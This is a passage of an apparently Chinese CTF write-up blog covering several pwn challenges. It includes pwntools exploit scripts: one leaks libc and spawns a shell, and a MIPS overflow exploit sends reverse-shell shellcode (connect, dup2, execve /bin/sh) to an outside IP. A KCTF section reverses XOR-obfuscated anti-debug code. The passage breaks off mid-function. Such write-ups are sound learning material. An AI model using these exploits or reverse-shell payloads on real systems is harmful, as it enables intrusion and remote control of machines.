v2,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    v9,</span><br><span class="line">    v10);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v8;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">xRead</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp-48h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp-44h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-40h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the file path: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;v4);</span><br><span class="line">  v0 = (<span class="keyword">char</span> *)&amp;v4 + <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  *(_DWORD *)v0 = 'unx_';</span><br><span class="line">  *((_WORD *)v0 + 2) = 'ac';</span><br><span class="line">  v0[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  you[<span class="number">64</span>] = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="string">"w+"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !you[<span class="number">64</span>] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Digest length: "</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Digest: "</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 += read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;you[<span class="number">66</span>] + v2, v3 - v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;you[<span class="number">65</span>] + v2 + <span class="number">3</span>) != <span class="string">'\n'</span> );</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x3ac6c</span>,<span class="number">0x3ac6e</span>,<span class="number">0x3ac72</span>,<span class="number">0x3ac79</span>,<span class="number">0x3ac9c</span>,<span class="number">0x3ac9d</span>,<span class="number">0x5fbd5</span>,<span class="number">0x5fbd6</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateFile</span><span class="params">(path,sz,dig)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; \n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input the file path: \n"</span>,path)</span><br><span class="line">    p.sendlineafter(<span class="string">"Digest length: \n"</span>,str(sz))</span><br><span class="line">    p.sendafter(<span class="string">"Digest: \n"</span>,dig)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">"I want to know your name again"</span>)</span><br><span class="line">    p.sendline(<span class="string">"xmzyshypnc"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"I will give a present to you.\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    libc_base = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - libc.sym[<span class="string">'calloc'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x08049843')</span></span><br><span class="line">    shell_addr = libc_base + <span class="number">0x1487fc</span></span><br><span class="line">    CreateFile(<span class="string">"a"</span>,<span class="number">0xe80</span>,<span class="string">'\x00'</span>*<span class="number">4</span>+p32(shell_addr)+<span class="string">'a'</span>*<span class="number">0xe77</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; \n"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="X-NUCA-团队赛-qmips"><a href="#X-NUCA-团队赛-qmips" class="headerlink" title="X-NUCA 团队赛 qmips"></a>X-NUCA 团队赛 qmips</h2><h3 id="漏洞分析-amp-amp-漏洞利用-3"><a href="#漏洞分析-amp-amp-漏洞利用-3" class="headerlink" title="漏洞分析 &amp;&amp; 漏洞利用"></a>漏洞分析 &amp;&amp; 漏洞利用</h3><p>mips32大端程序，直接拿超长payload测试可以发现存在溢出，cyclic可以找到溢出长度，search发现除了在栈上存在输入数据，heap上也有，并且heap地址为固定值(qemu-system/qemu-user态测试堆地址均不变)，因此在输入前布置shellcode，最后跳转过去执行即可。</p>
<p>这里的shellcode前半部分connect使用shellcraft自带的方法，后面dup2和execve是自己写的shellcode。</p>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!coding=utf8</span></span><br><span class="line"><span class="comment">#gdbserver 0.0.0.0:6666 ./sampmips 4444</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'mips'</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line">context.endian = <span class="string">'big'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"10.104.252.112"</span>,<span class="number">8889</span>)</span><br><span class="line"><span class="comment">#p = remote("10.101.168.38",4444)</span></span><br><span class="line"></span><br><span class="line">stage0 = shellcraft.mips.linux.connect(<span class="string">"127.0.0.1"</span>, <span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(shellcshode,len(shellcode))</span></span><br><span class="line">stage1 = <span class="string">"""</span></span><br><span class="line"><span class="string">    sw $v0,10($sp);</span></span><br><span class="line"><span class="string">    lw $v0,10($sp);</span></span><br><span class="line"><span class="string">    addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">    addiu $v0,$zero,4063</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lw $v0,10($sp);</span></span><br><span class="line"><span class="string">    addiu $a1,$zero,1</span></span><br><span class="line"><span class="string">    addiu $v0,$zero,4063</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lw $v0,10($sp);</span></span><br><span class="line"><span class="string">    addiu $a1,$zero,2</span></span><br><span class="line"><span class="string">    addiu $v0,$zero,4063</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lui $t6,0x2f62</span></span><br><span class="line"><span class="string">    ori $t6,$t6,0x696e</span></span><br><span class="line"><span class="string">    sw $t6,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lui $t7,0x2f2f</span></span><br><span class="line"><span class="string">    ori $t7,$t7,0x7368</span></span><br><span class="line"><span class="string">    sw $t7,32($sp)</span></span><br><span class="line"><span class="string">    sw $zero,36($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    la $a0,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">    addiu $a2,$zero,0</span></span><br><span class="line"><span class="string">    addiu $v0,$zero,4011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload = asm(shellcraft.mips.linux.connect(<span class="string">'10.104.252.112'</span>,<span class="number">6931</span>))</span><br><span class="line">payload += asm(stage1)</span><br><span class="line">payload = payload.ljust(<span class="number">544</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload += p32(<span class="number">0x418280</span>)</span><br><span class="line"><span class="comment">#print cyclic_find(0x6c616166)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    print(p.recv())</span><br><span class="line">    <span class="comment"># p.interactive()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/19/xihulunjian/1.png" alt></p>
<h2 id="KCTF-Q3-pwn1"><a href="#KCTF-Q3-pwn1" class="headerlink" title="KCTF Q3 pwn1"></a>KCTF Q3 pwn1</h2><h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>这道题有意思的地方在于多了一些逆向的东西，最后一步步地把它变成了自己熟悉的形态。</p>
<p>直接去运行程序会得到<code>Please run in docker!</code>的输入，让人摸不着头脑.jpg，直接去搜字符串也搜不到。我们看一下check_docker，发现这里通过异或隐藏了上述字符串，那么程序怎样才能正常运行起来呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stack_val[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  check_docker();</span><br><span class="line">  get_input((__int64)stack_val);</span><br><span class="line">  Mov(stack_val, (__int64)&amp;bss_input);</span><br><span class="line">  sub_4015FA(stack_val);</span><br><span class="line">  sub_400DFC();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看一眼.init_array，它先于main函数被执行，可以找到两个函数，我们看一眼fini_func函数，其调用了fini1，fini2调用了fini2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.init_array:0000000000601DD8 90 0A 40 00 00 00 00 00+funcs_401849    dq offset init_func1    ; DATA XREF: LOAD:00000000004000F8↑o</span><br><span class="line">.init_array:0000000000601DD8 BF 0B 40 00 00 00 00 00                                         ; LOAD:0000000000400210↑o ...</span><br><span class="line">.init_array:0000000000601DD8                                         dq offset fini_func</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">fini_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fini1(<span class="number">1</span>, <span class="number">0xFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">fini1</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> &amp;&amp; a2 == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::Init::Init((<span class="built_in">std</span>::ios_base::Init *)&amp;unk_6022C8);</span><br><span class="line">    __cxa_atexit((__int64)<span class="built_in">std</span>::ios_base::Init::~Init, (__int64)&amp;unk_6022C8, (__int64)&amp;unk_602090);</span><br><span class="line">    fini2((<span class="keyword">void</span> **)&amp;bss_libc_str);</span><br><span class="line">    result = __cxa_atexit((__int64)sub_400E66, (__int64)&amp;bss_libc_str, (__int64)&amp;unk_602090);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">fini2</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  OpenLibc(a1);</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)AntiDebug(a1) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = AutoChange(a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OpenLibc函数打开了libc文件，这里可以写个解码函数进行解码，有个技巧是可以将变量转化为数组，这样方便拷贝c代码出去直接运行即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">OpenLibc</span><span class="params">(<span class="keyword">void</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> file[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  file[<span class="number">0</span>] = <span class="number">91</span>;</span><br><span class="line">  file[<span class="number">1</span>] = <span class="number">94</span>;</span><br><span class="line">  file[<span class="number">2</span>] = <span class="number">85</span>;</span><br><span class="line">  file[<span class="number">3</span>] = <span class="number">84</span>;</span><br><span class="line">  file[<span class="number">4</span>] = <span class="number">25</span>;</span><br><span class="line">  file[<span class="number">5</span>] = <span class="number">68</span>;</span><br><span class="line">  file[<span class="number">6</span>] = <span class="number">88</span>;</span><br><span class="line">  file[<span class="number">7</span>] = <span class="number">25</span>;</span><br><span class="line">  file[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">  file[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    file[i] ^= <span class="number">0x37</span>u;</span><br><span class="line">  *a1 = dlopen(file, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，AntiDebug函数也用相同方法逆出逻辑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">AntiDebug</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 (__fastcall *get_pid_)(__int64, <span class="keyword">char</span> *); <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 (__fastcall *fopen_)(<span class="keyword">char</span> *, <span class="keyword">void</span> *); <span class="comment">// ST50_8</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *fclose_)(__int64, <span class="keyword">char</span> *); <span class="comment">// ST78_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-134h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+20h] [rbp-130h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [rsp+24h] [rbp-12Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> l; <span class="comment">// [rsp+28h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> m; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> n; <span class="comment">// [rsp+30h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> ii; <span class="comment">// [rsp+34h] [rbp-11Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> jj; <span class="comment">// [rsp+38h] [rbp-118h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> kk; <span class="comment">// [rsp+3Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *snprintf_)(<span class="keyword">char</span> *, <span class="keyword">signed</span> __int64, <span class="keyword">char</span> *, _QWORD); <span class="comment">// [rsp+40h] [rbp-110h]</span></span><br><span class="line">  __int64 fp; <span class="comment">// [rsp+58h] [rbp-F8h]</span></span><br><span class="line">  __int64 (__fastcall *fgets_)(<span class="keyword">char</span> *, <span class="keyword">signed</span> __int64, __int64); <span class="comment">// [rsp+60h] [rbp-F0h]</span></span><br><span class="line">  __int64 (__fastcall *strstr_)(<span class="keyword">char</span> *, <span class="keyword">char</span> *); <span class="comment">// [rsp+68h] [rbp-E8h]</span></span><br><span class="line">  __int64 (__fastcall *atoi_)(_BYTE *); <span class="comment">// [rsp+70h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">char</span> atoi_str[<span class="number">4</span>]; <span class="comment">// [rsp+80h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+84h] [rbp-CCh]</span></span><br><span class="line">  <span class="keyword">char</span> fopen_str[<span class="number">5</span>]; <span class="comment">// [rsp+90h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+95h] [rbp-BBh]</span></span><br><span class="line">  <span class="keyword">char</span> fgets_str[<span class="number">5</span>]; <span class="comment">// [rsp+A0h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+A5h] [rbp-ABh]</span></span><br><span class="line">  <span class="keyword">char</span> get_pid_str[<span class="number">6</span>]; <span class="comment">// [rsp+B0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+B6h] [rbp-9Ah]</span></span><br><span class="line">  <span class="keyword">char</span> strstr_str[<span class="number">6</span>]; <span class="comment">// [rsp+C0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+C6h] [rbp-8Ah]</span></span><br><span class="line">  <span class="keyword">char</span> fclose_str[<span class="number">6</span>]; <span class="comment">// [rsp+D0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+D6h] [rbp-7Ah]</span></span><br><span class="line">  <span class="keyword">char</span> snprintf_str[<span class="number">8</span>]; <span class="comment">// [rsp+E0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+E8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> trace_pid[<span class="number">9</span>]; <span class="comment">// [rsp+F0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [rsp+F9h] [rbp-57h]</span></span><br><span class="line">  <span class="keyword">char</span> proc_status[<span class="number">15</span>]; <span class="comment">// [rsp+100h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [rsp+10Fh] [rbp-41h]</span></span><br><span class="line">  <span class="keyword">char</span> proc_status_str; <span class="comment">// [rsp+110h] [rbp-40h]</span></span><br><span class="line">  _BYTE v40[<span class="number">6</span>]; <span class="comment">// [rsp+11Ah] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v41; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v41 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  proc_status[<span class="number">0</span>] = <span class="number">52</span>;</span><br><span class="line">  proc_status[<span class="number">1</span>] = <span class="number">107</span>;</span><br><span class="line">  proc_status[<span class="number">2</span>] = <span class="number">105</span>;</span><br><span class="line">  proc_status[<span class="number">3</span>] = <span class="number">116</span>;</span><br><span class="line">  proc_status[<span class="number">4</span>] = <span class="number">120</span>;                         <span class="comment">// proc_status</span></span><br><span class="line">  proc_status[<span class="number">5</span>] = <span class="number">52</span>;</span><br><span class="line">  proc_status[<span class="number">6</span>] = <span class="number">62</span>;</span><br><span class="line">  proc_status[<span class="number">7</span>] = <span class="number">127</span>;</span><br><span class="line">  proc_status[<span class="number">8</span>] = <span class="number">52</span>;</span><br><span class="line">  proc_status[<span class="number">9</span>] = <span class="number">104</span>;</span><br><span class="line">  proc_status[<span class="number">10</span>] = <span class="number">111</span>;</span><br><span class="line">  proc_status[<span class="number">11</span>] = <span class="number">122</span>;</span><br><span class="line">  proc_status[<span class="number">12</span>] = <span class="number">111</span>;</span><br><span class="line">  proc_status[<span class="number">13</span>] = <span class="number">110</span>;</span><br><span class="line">  proc_status[<span class="number">14</span>] = <span class="number">104</span>;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">    proc_status[i] ^= <span class="number">0x1B</span>u;</span><br><span class="line">  trace_pid[<span class="number">0</span>] = <span class="number">117</span>;</span><br><span class="line">  trace_pid[<span class="number">1</span>] = <span class="number">83</span>;</span><br><span class="line">  trace_pid[<span class="number">2</span>] = <span class="number">64</span>;</span><br><span class="line">  trace_pid[<span class="number">3</span>] = <span class="number">66</span>;</span><br><span class="line">  trace_pid[<span class="number">4</span>] = <span class="number">68</span>;</span><br><span class="line">  trace_pid[<span class="number">5</span>] = <span class="number">83</span>;</span><br><span class="line">  trace_pid[<span class="number">6</span>] = <span class="number">113</span>;</span><br><span class="line">  trace_pid[<span class="number">7</span>] = <span class="number">72</span>;</span><br><span class="line">  trace_pid[<span class="number">8</span>] = <span class="number">69</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">    trace_pid[j] ^= <span class="number">0x21</span>u;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;proc_status_str, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  snprintf_str[<span class="number">0</span>] = <span class="number">94</span>;</span><br><span class="line">  snprintf_str[<span class="number">1</span>] = <span class="number">67</span>;</span><br><span class="line">  snprintf_str[<span class="number">2</span>] = <span class="number">93</span>;</span><br><span class="line">  snprintf_str[<span class="number">3</span>] = <span class="number">95</span>;</span><br><span class="line">  snprintf_str[<span class="number">4</span>] = <span class="number">68</span>;</span><br><span class="line">  snprintf_str[<span class="number">5</span>] = <span class="number">67</span>;</span><br><span class="line">  snprintf_str[<span class="number">6</span>] = <span class="number">89</span>;</span><br><span class="line">  snprintf_str[<span class="number">7</span>] = <span class="number">75</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    snprintf_str[k] ^= <span class="number">0x2D</span>u;</span><br><span class="line">  snprintf_ = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">signed</span> __int64, <span class="keyword">char</span> *, _QWORD))CallLibFunc((<span class="keyword">void</span> **)a1, snprintf_str);</span><br><span class="line">  get_pid_str[<span class="number">0</span>] = <span class="number">81</span>;</span><br><span class="line">  get_pid_str[<span class="number">1</span>] = <span class="number">83</span>;</span><br><span class="line">  get_pid_str[<span class="number">2</span>] = <span class="number">66</span>;</span><br><span class="line">  get_pid_str[<span class="number">3</span>] = <span class="number">70</span>;</span><br><span class="line">  get_pid_str[<span class="number">4</span>] = <span class="number">95</span>;</span><br><span class="line">  get_pid_str[<span class="number">5</span>] = <span class="number">82</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">5</span>; ++l )</span><br><span class="line">    get_pid_str[l] ^= <span class="number">0x36</span>u;</span><br><span class="line">  get_pid_ = (__int64 (__fastcall *)(__int64, <span class="keyword">char</span> *))CallLibFunc((<span class="keyword">void</span> **)a1, get_pid_str);</span><br><span class="line">  v2 = get_pid_(a1, get_pid_str);</span><br><span class="line">  snprintf_(&amp;proc_status_str, <span class="number">0x30</span>LL, proc_status, v2);</span><br><span class="line">  fopen_str[<span class="number">0</span>] = <span class="number">36</span>;</span><br><span class="line">  fopen_str[<span class="number">1</span>] = <span class="number">45</span>;</span><br><span class="line">  fopen_str[<span class="number">2</span>] = <span class="number">50</span>;</span><br><span class="line">  fopen_str[<span class="number">3</span>] = <span class="number">39</span>;</span><br><span class="line">  fopen_str[<span class="number">4</span>] = <span class="number">44</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">4</span>; ++m )</span><br><span class="line">    fopen_str[m] ^= <span class="number">0x42</span>u;</span><br><span class="line">  fopen_ = (__int64 (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">void</span> *))CallLibFunc((<span class="keyword">void</span> **)a1, fopen_str);</span><br><span class="line">  fp = fopen_(&amp;proc_status_str, &amp;unk_401885);</span><br><span class="line">  <span class="keyword">if</span> ( !fp )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  fgets_str[<span class="number">0</span>] = <span class="number">93</span>;</span><br><span class="line">  fgets_str[<span class="number">1</span>] = <span class="number">92</span>;</span><br><span class="line">  fgets_str[<span class="number">2</span>] = <span class="number">94</span>;</span><br><span class="line">  fgets_str[<span class="number">3</span>] = <span 